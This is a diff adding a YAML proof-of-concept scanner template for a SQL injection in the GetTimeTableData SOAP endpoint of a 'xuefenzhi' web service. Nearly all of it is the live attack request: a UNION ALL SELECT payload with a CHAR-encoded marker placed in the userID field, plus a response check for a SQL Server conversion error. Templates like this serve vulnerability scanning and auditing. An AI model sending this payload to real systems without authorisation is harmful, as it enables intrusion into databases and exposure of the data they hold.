@@ -1,0 +1,33 @@
+name: poc-yaml-xuefenzhi-GetTimeTableData-sql-injection
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /WebService/Interactive.asmx
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+      body: "\
+        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n\
+          <soapenv:Header/>\r\n\
+          <soapenv:Body>\r\n\
+            <tem:GetTimeTableData>\r\n\
+              <!--type: string-->\r\n\
+              <tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHAR(97)+CHAR(78)+CHAR(86)+CHAR(85)+CHAR(82)+CHAR(87)+CHAR(68)+CHAR(97)+CHAR(71)+CHAR(70)+CHAR(71)+CHAR(80)+CHAR(81)+CHAR(115)+CHAR(88)+CHAR(102)+CHAR(83)+CHAR(114)+CHAR(98)+CHAR(88)+CHAR(116)+CHAR(68)+CHAR(79)+CHAR(90)+CHAR(120)+CHAR(75)+CHAR(74)+CHAR(83)+CHAR(106)+CHAR(85)+CHAR(87)+CHAR(66)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hene</tem:userID>\r\n\
+              <!--type: string-->\r\n\
+              <tem:startDate>sonoras imperio</tem:startDate>\r\n\
+            </tem:GetTimeTableData>\r\n\
+          </soapenv:Body>\r\n\
+        </soapenv:Envelope>\r\n\
+        "
+    expression: response.status == 500 && response.body.bcontains(b'转换成数据类型 int 时失败')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140069973
+
